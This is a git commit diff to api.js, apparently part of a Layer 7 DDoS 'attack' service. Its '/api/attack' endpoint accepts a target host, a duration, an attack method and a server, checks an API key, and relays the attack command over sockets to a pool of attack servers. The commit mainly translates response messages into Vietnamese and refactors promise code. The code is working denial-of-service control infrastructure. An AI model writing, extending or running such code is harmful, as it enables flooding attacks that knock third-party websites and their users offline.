2cde4d3149a9b919d1d9e94201bb1f886bdcfe9a
Đậu Đậu <59077968+DauDau432@users.noreply.github.com>
2023-10-13 22:20:25 +0700

    Update api.js

--- api.js
+++ api.js
@@ -30,15 +30,15 @@ app.get(`/api/attack`, async (req, res) => {
     };
 
     // kiểm tra bảo mật API
-    if (field.api_key !== api_key) return res.json({ status: 500, data: `invalid api key` });
-    if (domain_lock && req.hostname !== api_domain) return res.json({ status: 500, data: `request is not coming from an authorized domain` });
+    if (field.api_key !== api_key) return res.json({ status: 500, data: `khóa api không hợp lệ` });
+    if (domain_lock && req.hostname !== api_domain) return res.json({ status: 500, data: `yêu cầu không đến từ miền được ủy quyền` });
 
     //kiểm tra các trường
     const containsBlacklisted = blackList.some(char => field.host.includes(char));
-    if (!field.host || !urlRegex.test(field.host) || containsBlacklisted) return res.json({ status: 500, data: `host needs to be a valid URL` });
-    if (!field.time || isNaN(field.time) || field.time > 86400) return res.json({ status: 500, data: `time needs to be a number between 0-65535` });
-    if (!field.server || !servers.hasOwnProperty(field.server)) return res.json({ status: 500, data: `server is invalid or not found in the servers list` });
-    if (!field.method || !Object.keys(commands).includes(field.method.toUpperCase()) && field.method !== "stop") return res.json({ status: 500, data: `invalid attack method` });
+    if (!field.host || !urlRegex.test(field.host) || containsBlacklisted) return res.json({ status: 500, data: `máy chủ cần phải là một URL hợp lệ` });
+    if (!field.time || isNaN(field.time) || field.time > 86400) return res.json({ status: 500, data: `thời gian cần phải là một số trong khoảng 0-86400` });
+    if (!field.server || !servers.hasOwnProperty(field.server)) return res.json({ status: 500, data: `máy chủ không hợp lệ hoặc không được tìm thấy trong danh sách máy chủ` });
+    if (!field.method || !Object.keys(commands).includes(field.method.toUpperCase()) && field.method !== "stop") return res.json({ status: 500, data: `phương pháp tấn công không hợp lệ` });
 
     try {
 
@@ -69,11 +69,11 @@ app.get(`/api/attack`, async (req, res) => {
         const elapsedTime = process.hrtime(startTime);
         const elapsedTimeMs = elapsedTime[0] * 1000 + elapsedTime[1] / 1000000;
 
-        console.log(`Tấn công mục tiêu ${field.host} bằng phương pháp ${field.method}. Thời gian: ${elapsedTimeMs.toFixed(2)} ms`);
+        console.log(`Tấn công mục tiêu ${field.host} bằng phương pháp ${field.method}. Thời gian: ${elapsedTimeMs.toFixed(2)} giây`);
 
         return res.json({
             status: 200,
-            message: 'attack started successfully',
+            message: 'cuộc tấn công start thành công',
             id: attackid,
             elapsed_time: elapsedTimeMs.toFixed(2),
             data: {
@@ -96,29 +96,30 @@ app.get(`/api/attack`, async (req, res) => {
 app.listen(api_port, () => console.log(`API socket Layer7 đã start trên cổng ${api_port}`));
 
 function sendData(serverName, data) {
-    return new Promise((resolve, reject) => {
+    return new Promise(async (resolve, reject) => {
         if (serverName === 'all') {
             const promises = [];
+
             for (const server of Object.values(servers)) {
                 promises.push(sendToServer(server, data));
             }
-            Promise.all(promises)
-                .then((results) => {
-                    response = results.toString()
-                    resolve(response);
-                })
-                .catch((err) => {
-                    reject(err);
-                });
+
+            try {
+                const results = await Promise.all(promises);
+                const response = results.map(result => result.toString());
+                resolve(response);
+            } catch (err) {
+                reject(err);
+            }
         } else {
             const server = servers[serverName];
             if (server) {
                 sendToServer(server, data)
-                    .then((result) => {
-                        response = result.toString()
+                    .then(result => {
+                        const response = result.toString();
                         resolve(response);
                     })
-                    .catch((err) => {
+                    .catch(err => {
                         reject(err);
                     });
             } else {
@@ -130,7 +131,7 @@ function sendData(serverName, data) {
 
 function sendToServer(server, data) {
     return new Promise((resolve, reject) => {
-        console.log(`Gửi cuộc tấn công đến máy chủ ${server.name}`);
+        console.log(`Gửi yêu cầu đến máy chủ ${server.name}`);
 
         const socket = new net.Socket();
 
